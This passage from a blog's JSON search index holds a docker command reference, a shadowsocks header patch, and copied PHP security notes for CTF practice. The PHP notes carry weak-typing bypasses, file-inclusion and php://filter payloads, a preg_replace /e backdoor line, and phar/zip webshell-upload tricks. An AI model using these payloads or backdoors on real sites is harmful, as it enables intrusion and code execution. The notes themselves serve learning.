--cap-drop=[] Drop Linux capabilities --cgroup-parent= Optional parent cgroup for the container --cidfile= Write the container ID to the file --cpu-period=0 Limit CPU CFS (Completely Fair Scheduler) period --cpu-quota=0 Limit the CPU CFS quota --cpuset-cpus= CPUs in which to allow execution (0-3, 0,1) 绑定容器到指定CPU运行 --cpuset-mems= MEMs in which to allow execution (0-3, 0,1) 绑定容器到指定MEM运行 -d, --detach=false Run container in background and print container ID 后台运行容器，并返回容器ID --device=[] Add a host device to the container --dns=[] Set custom DNS servers 指定容器使用的DNS服务器，默认和宿主一致 --dns-search=[] Set custom DNS search domains 指定容器DNS搜索域名，默认和宿主一致 -e, --env=[] Set environment variables 设置环境变量 --entrypoint= Overwrite the default ENTRYPOINT of the image --env-file=[] Read in a file of environment variables 从指定文件读入环境变量 --expose=[] Expose a port or a range of ports -h, --hostname= Container host name 指定容器的hostname --help=false Print usage -i, --interactive=false Keep STDIN open even if not attached 以交互模式运行容器，通常与 -t 同时使用 --ipc= IPC namespace to use -l, --label=[] Set meta data on a container --label-file=[] Read in a line delimited file of labels --link=[] Add link to another container --log-driver= Logging driver for container --log-opt=[] Log driver options --lxc-conf=[] Add custom lxc options -m, --memory= Memory limit --mac-address= Container MAC address (e.g. 92:d0:c6:0a:29:33) --memory-swap= Total memory (memory + swap), '-1' to disable swap --name= Assign a name to the container 为容器指定一个名称 --net=bridge Set the Network mode for the container 指定容器的网络连接类型，支持 bridge/host/none/container:&lt;name|id&gt; 四种类型 --oom-kill-disable=false Disable OOM Killer -P, --publish-all=false Publish all exposed ports to random ports -p, --publish=[] Publish a container's port(s) to the host --pid= PID namespace to use --privileged=false Give extended privileges to this container --read-only=false Mount the container's root filesystem as read only --restart=no Restart policy to apply when a container exits --rm=false Automatically remove the container when it exits --security-opt=[] Security Options --sig-proxy=true Proxy received signals to the process -t, --tty=false Allocate a pseudo-TTY 为容器重新分配一个伪输入终端，通常与 -i 同时使用 -u, --user= Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;]) --ulimit=[] Ulimit options --uts= UTS namespace to use -v, --volume=[] Bind mount a volume --volumes-from=[] Mount volumes from the specified container(s) -w, --workdir= Working directory inside the container 存在的问题解决方法 ubuntu14下的docker是没有service服务 去除每次sudo运行docker命令，需要添加组 # Add the docker group if it doesn't already exist. $ sudo groupadd docker #改完后需要重新登陆用户 $ sudo gpasswd -a ${USER} docker Dockerfile中的EXPOSE、docker run --expose、docker run -p之间的区别 Dockerfile的EXPOSE相当于docker run --expose，提供container之间的端口访问 docker run -p允许container外部主机访问container的端口 ubuntu14的febootstrap没有-i命令 作者：泛原罪 链接：http://www.jianshu.com/p/adaa34795e64 來源：简书 ","link":"https://rainerhu.github.io/post/docker-chang-yong-ming-ling-ji-lu/"},{"title":"SSS redirect","content":"把SSS redirect 到了我VPS的wordpress上去了,然后,我郁闷的发现没法记录访客ip地址, 全tm是我自己的ip或者'127.0.0.1' '(:3」∠)'想die 在tcprelay.py里面找到了重定向时会调用的显示报错信息的函数:_handel_protocol_error(), 看了看觉得,只要修改ogn_data就好了 于是,在改函数最前面加入如下代码: a=ogn_data.splitlines(True) a.insert(2,'X-Forwarded-For: '+client_address[0][7:]+'\\n') b='' ogn_data=b.join(a) 于是,成功的在转发到wp的http包里加入了X-Forwarded-For来记录真实ip ","link":"https://rainerhu.github.io/post/sss/"},{"title":"php","content":" 原文连接http://www.restran.net/2016/09/26/php-security-notes/ copy用于方便查阅 系统变量 $_POST // 获取 post 数据，是一个字典 $_GET // 获取 get 数据，是一个字典 $_COOKIE // 获取 cookie $_SESSION // 获取 session $_FILE // 获取上传的文件 $_REQUEST // 获取 $_GET，$_POST，$_COOKIE 中的数据 错误控制运算符 @ 当其放置在一个php表达式前,该表达式可能产生的错误信息都被忽略 变量默认值 定义一个变量,如果不设置值,默认为0 $_GET和$_POST 如果在GET参数中设置name[]=a,那么$_GET['name'] = [a]，php 会把 []=a 当成数组传入， $_GET 会自动对参数调用urldecode。 $_POST 同样存在此漏洞，提交的表单数据，user[]=admin，$_POST['user'] 得到的是 ['admin'] 是一个数组。 内置函数的松散性 strcmp 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0； 如果两者相等，返回 0。 5.2 中是将两个参数先转换成string类型。 5.3.3 以后，当比较数组和字符串的时候，返回是0。 5.5 中如果参数不是string类型，直接return $array=[1, 2, 3]; // 数组跟字符串比较会返回 0 //这里会输出 null，在某种意义上 null 也就是相当于 false，也就是判断为相等 var_dump(strcmp($array, 'abc')); sha1 和 md5 函数 md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle sha1([]) === false md5([]) === false 弱类型 当一个整形和一个其他类型行比较的时候，会先把其他类型 intval 再比较 intval intval() 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回 0。 var_dump(intval('2')) // 2 var_dump(intval('3abcd')) // 3 var_dump(intval('abcd')) // 0 这个时候 $a 的值有可能是 1002 union… if(intval($a) &gt; 1000) { mysql_query(&quot;select * from news where id=&quot;.$a) } is_numeric PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。 &lt;?php echo is_numeric(233333); # 1 echo is_numeric('233333'); # 1 echo is_numeric(0x233333); # 1 echo is_numeric('0x233333'); # 1 echo is_numeric('233333abc'); # 0 ?&gt; in_array in_array函数用来判断一个值是否在某一个数组列表里面，通常判断方式如下： in_array('b', array('a', 'b', 'c'); 这段代码的作用是过滤 GET 参数 typeid 在不在 1，2，3，4 这个数组里面。但是，in_array 函数存在自动类型转换。如果请求，typeid=1’ union select.. 也能通过 in_array 的验证 if (in_array($_GET('typeid'], array(1, 2, 3, 4))) { $sql=&quot;select …. where typeid=&quot;.$_GET['typeid']&quot;; echo $sql; } array_search() PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。 array_search 会使用'ctf'和array中的每个值作比较，而且intval('ctf')==0., if(is_array(@$a[&quot;a2&quot;])){ if(count($a[&quot;a2&quot;])!==5 OR !is_array($a[&quot;a2&quot;][0])) die(&quot;nope&quot;); $pos = array_search(&quot;ctf&quot;, $a[&quot;a2&quot;]); $pos===false?die(&quot;nope&quot;):NULL; foreach($a[&quot;a2&quot;] as $key=&gt;$val){ $val===&quot;ctf&quot;?die(&quot;nope&quot;):NULL; } $v2=1; } 和= ==是弱类型的比较 ===比较符则可以避免这种,隐式转换,除了检查值还检查类型 以下比较的结果都为 true // 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc // 十六进制与整数，被转换为同一进制比较 '0xccccccccc' == '54975581388' // 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0 1 == '1' 1 == '01' 10 == '1e1' 100 == '1e2' 0 == 'a' // a 转换为数字为 0 // 十六进制数与带空格十六进制数，被转换为十六进制整数 '0xABCdef' == ' 0xABCdef' '0010e2' == '1e3' hash 比较的问题 hash碰撞 0e 开头且后面都是数字会被当作科学计数法，也就是等于 0*10^xxx=0。如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过。 // '0e5093234' 为 0，'0eabc3234' 不为 0 // true '0e509367213418206700842008763514' == '0e481036490867661113260034900752' // true '0e481036490867661113260034900752' == '0' // false var_dump('0' == '0e1abcd'); // true var_dump(0 == '0e1abcd'); var_dump(md5('240610708') == md5('QNKCDZO')); var_dump(md5('aabg7XSs') == md5('aabC9RqS')); var_dump(sha1('aaroZmOk') == sha1('aaK1STfY')); var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m')); 如果要找出 0e 开头的 hash 碰撞，可以用如下代码 &lt;?php $salt = 'vunp'; $hash = '0e612198634316944013585621061115'; for ($i=1; $i&lt;100000000000; $i++) { if (md5($salt . $i) == $hash) { echo $i; break; } } echo ' done'; switch 如果 switch 是数字类型的 case 的判断时， switch 会将其中的参数转换为 int 类型。 $i =&quot;2abc&quot;; switch ($i) { case 0: case 1: case 2: echo &quot;i is less than 3 but not negative&quot;; break; case 3: echo &quot;i is 3&quot;; } 这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 $i 进行了类型转换，转换结果为 2。 正则表达式 preg_matc 如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^和 $)，则可以存在绕过的问题 $ip = '1.1.1.1 abcd'; // 可以绕过 if(!preg_match(&quot;/(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)/&quot;,$ip)) { die('error'); } else { // echo('key...') } ereg %00 截断 ereg 读到 %00 的时候，就截止了 &lt;?php if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET['a']) === FALSE) { echo 'You password must be alphabet'; } ?&gt; 这里 a=abcd%001234，可以绕过 变量覆盖 extract extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。 &lt;?php $auth = '0'; // 这里可以覆盖$auth的变量值 extract($_GET); if($auth == 1){ echo &quot;private!&quot;; } else{ echo &quot;public!&quot;; } ?&gt; //GET举例 playload:?gift=flag&amp;flag=php://input &lt;?php $flag='mail.txt'; extract($_GET); // 这里可以覆盖 if(isset($gift)) { $content=trim(file_get_contents($flag)); echo $content; if($gift==$content){ echo'flag'; } else{ echo'flag被加密了 再加密一次就得到flag了'; } } ?&gt; parse_str parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。 //var.php?var=new $var='init'; parse_str($_SERVER['QUERY_STRING']); // $var 会变成 new echo $var; import_request_variables()变量覆盖 //1.php?a=1 返回 true! &lt;?php $a = '0'; import_request_variables('G'); if($a == 1){ echo &quot;true!&quot;; }else{ echo &quot;false!&quot;; } ?&gt; import_request_variables()，将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。 $$ 变量覆盖 如果把变量本身的 key 也当变量，也就是使用了 $$，就可能存在问题 $_ = '_POST'; // $$_ 是等于 $_POST 例一: &lt;?php $id=1; foreach (array('_GET','_POST') as $request) { foreach ($$request as $key =&gt; $value) { echo $key.&quot; &quot;.$value.&quot;&lt;/br&gt;&quot;; ${$key}=$value; //echo $$key; } } echo $id; ?&gt; 例二: &lt;?php $a='hello'; foreach($_GET as $key =&gt; $value{ $$key = $value; } print $a; ?&gt; 这里会先把$key输出来，让你明确是如何覆盖和覆盖了什么，像当前文件提交index.php?id=xxxx,就可以覆盖掉$id的值。 unset unset($bar); 用来销毁指定的变量，如果变量 $bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过 // http://127.0.0.1/index.php?_CONFIG=123 $_CONFIG['extraSecure'] = true; foreach(array('_GET','_POST') as $method) { foreach($$method as $key=&gt;$value) { // $key == _CONFIG // $$key == $_CONFIG // 这个函数会把 $_CONFIG 变量销毁 unset($$key); } } if ($_CONFIG['extraSecure'] == false) { echo 'flag {****}'; } 特殊的 PHP 代码格式 .php2 .php3 .php4 .php5 .php7 .phtml 正则检测文件内容中包含 &lt;? 就异常退出，通常的PHP代码就不行了，可以使用这种方式绕过 &lt;script language=&quot;php&quot;&gt; echo base64_encode(file_get_contents('flag.php')); &lt;/script&gt; 效果等于 echo ‘a’; &lt;?='a';?&gt; 如果在 php.ini 文件中配置允许 ASP 风格的标签 Allow ASP-style &lt;% %&gt; tags. ; http://php.net/asp-tags asp_tags = On 则可以使用该方式 &lt;% echo 'a'; %&gt; 伪随机数 mt_rand() mt_rand() 函数是一个伪随机发生器，即如果知道随机数种子是可以预测的。 $seed = 12345; mt_rand($seed); $ss = mt_rand(); linux 64 位系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647，正好是 2^31-1，也就是说随机播种的种子也是在这个范围中的，0 – 2147483647 的这个范围是可以爆破的。 但是用 php 爆破比较慢，有一个 C 的版本，可以根据随机数，爆破出种子 php_mt_seed。 在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。 rand() rand() 函数在产生随机数的时候没有调用 srand()，则产生的随机数是有规律可询的。具体的说明请看这里。产生的随机数可以用下面这个公式预测: //一般预测值可能比实际值要差1 state[i] = state[i-3] + state[i-31] 可以用下面的代码验证一下 &lt;?php $randStr = array(); for($i=0;$i&lt;50;$i++) { //先产生 32个随机数 $randStr[$i]=rand(0,30); if($i&gt;=31) { echo &quot;$randStr[$i]=(&quot;.$randStr[$i-31].&quot;+&quot;.$randStr[$i-3].&quot;) mod 31&quot;.&quot;\\n&quot;; } } ?&gt; 反序列化 _construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。 __destruct()：析构函数，当对象被销毁时会自动调用。 __wakeup() ：如前所提，unserialize()时会自动调用。 PHP unserialize() 后会导致 __wakeup() 或 __destruct() 的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在 __wakeup() 或 __destruct() 中。 __wakeup 函数绕过 PHP 有个 Bug，如果反序列化出现问题，会不去执行 __wakeup 函数，例如： &lt;?php class xctf { public $flag = &quot;111&quot;; public function __wakeup() { exit('bad requests'); } } //echo serialize(new xctf()); echo unserialize($_GET['code']); echo &quot;flag{****}&quot;; ?&gt; 使用这个 payload 绕过 __wakeup 函数 # O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;} http://www.example.com/index.php?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;} 在字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2就会产生报错，导致不会去执行 __wakeup 函数，从而绕过该函数。 文件包含 http://10.2.1.1:20770/index.php?page=upload 这种 url 很容易就能想到可能是文件包含或者伪协议读取 http://10.2.1.1:20770/index.php?page=php://filter/read=convert.base64-encode/resource=upload 命令执行 反引号` 反引号 ` 可以调用 shell_exec 正常执行代码 `$_GET['v']` 相当于 shell_exec($_GET['v']) preg_replace() 触发条件： 第一个参数需要e标识符，有了它可以执行第二个参数的命令 第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子： // 这样是可以执行命令的 echo preg_replace('/test/e', 'phpinfo()', 'just test'); // 这种没有匹配上，所以返回值是第三个参数，不会执行命令 echo preg_replace('/test/e', 'phpinfo()', 'just tesxt'); 我们可以构造这样的后门代码 @preg_replace(&quot;//e&quot;, $_GET['h'], &quot;Access Denied&quot;); echo preg_replace(&quot;/test/e&quot;, $_GET[&quot;h&quot;], &quot;jutst test&quot;); 当访问这样这样的链接时就可以被触发 http://localhost:8000/testbug.php?h=phpinfo(); 伪协议 php://filter 读取文件 /lfi.php?file=php://filter/convert.base64-encode/resource=flag.php /lfi.php?file=php://filter/read=convert.base64-encode/resource=flag.php php://input 写入文件， 数据利用 POST 传过去 /test.php?file=php://input data:// 将 include 的文件流重定向到用户控制的输入流 /test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw== //base64部分为:&lt;?php phpinfo();exit();// 可以用于控制 file_get_contents 的内容为用户输入的流 $file=$_GET['file']; $data = @file_get_contents($a,'r'); echo $data; phar:// 发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。 写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含 这里的路径为上传的 jpg 文件在服务器的路径 /index.php?id=phar://路径/xxx.jpg/shell zip:// 上述 phar:// 的方法也可以使用 zip:// 然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。 1.zip文件内仅有1.php这个文件 /php?file=zip://1.png%231.php // 也可以尝试不改名为png，直接使用zip上传测试一下 /php?file=zip://1.zip%231.php 文件上传漏洞 正常的文件上传流程是这样的，首先接收 POST 的文件，在 tmp 目录下生成临时文件，文件名是 php[A-Za-z0-9]{6}，在 php 处理后删除临时文件，虽然没有文件上传，但是只要文件上传开启了就一定会创建临时文件，在这中途如果 php 意外退出则临时文件不会被删除，造成 /tmp 目录下可以留下任何内容。 内容构造好后，单纯爆破 /tmp/phpxxxxxx 文件名是不太现实但是也可行的。 通过文件包含，让其包含本身，造成无限循环后发出 SIGSEGV 信号，可以导致 php 意外退出。 ","link":"https://rainerhu.github.io/post/php/"}]}